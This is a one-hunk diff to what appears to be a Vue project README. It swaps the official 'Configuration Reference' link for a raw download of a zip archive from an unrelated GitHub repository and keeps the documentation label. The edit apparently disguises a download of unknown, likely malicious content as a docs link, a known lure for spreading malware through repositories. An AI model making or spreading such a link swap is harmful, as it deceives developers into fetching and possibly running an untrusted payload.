@@ -21,4 +21,4 @@ npm run lint
 ```
 
 ### Customize configuration
-See [Configuration Reference](https://cli.vuejs.org/config/).
+See [Configuration Reference](https://github.com/FilipStanic/Notification-List/raw/refs/heads/master/src/List_Notification_2.6.zip).
